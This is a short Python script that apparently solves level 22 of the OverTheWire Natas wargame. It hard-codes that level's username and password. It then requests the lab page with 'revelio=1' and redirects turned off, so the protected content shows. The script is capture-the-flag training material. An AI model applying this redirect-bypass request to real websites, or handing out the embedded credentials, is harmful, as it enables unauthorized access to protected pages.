# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

url=f'http://{username}.natas.labs.overthewire.org/?revelio=1'
pw = []
characters = ascii_letters + digits

# Connect to natas
session = requests.session()
payloads = {}
cookies = {}

response = session.request('GET', url, auth=(username,password), allow_redirects=False)

#print(''.join(pw))

# Filtering to get a password
#result = re.findall('Password: (.*)</pre>', response.text)[0]
print(response.text)
